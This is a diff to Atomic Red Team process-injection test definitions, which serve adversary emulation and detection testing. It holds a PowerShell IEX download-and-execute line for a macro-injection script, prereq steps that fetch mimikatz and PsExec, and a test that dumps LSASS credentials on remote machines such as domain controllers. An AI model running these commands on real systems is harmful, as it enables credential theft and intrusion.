@@ -26,13 +26,15 @@ atomic_tests:
       Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
     name: powershell
 - name: Remote Process Injection in LSASS via mimikatz
   auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
   description: |
     Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+    Especially useful against domain controllers in Active Directory environments.
     It must be executed in the context of a user who is privileged on remote `machine`.
 
     The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -60,6 +62,7 @@ atomic_tests:
       if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
     get_prereq_command: |
       $mimikatz_path = cmd /c echo #{mimikatz_path}
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
       New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
@@ -69,6 +72,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
     get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
       Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
       New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
